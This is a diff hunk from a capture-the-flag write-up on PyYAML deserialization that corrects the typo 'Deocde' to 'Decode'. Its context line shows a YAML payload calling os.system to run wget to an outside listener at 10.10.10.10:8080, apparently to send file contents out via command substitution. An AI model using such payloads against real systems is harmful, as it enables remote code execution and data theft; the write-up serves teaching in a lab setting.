@@ -93,7 +93,7 @@ Payload : ```!!python/object/apply:os.system ["wget http://10.10.10.10:8080/?`ca
 
 ![image](https://user-images.githubusercontent.com/72421091/115276504-9ed30b80-a132-11eb-9ca7-0ff3dec4c682.png)
 
-Deocde the url encoded ```flag%7BPy_PyYaml_Yaml_Py%7D``` and we got our flag  
+Decode the url encoded ```flag%7BPy_PyYaml_Yaml_Py%7D``` and we got our flag  
 
 ## Flag
 
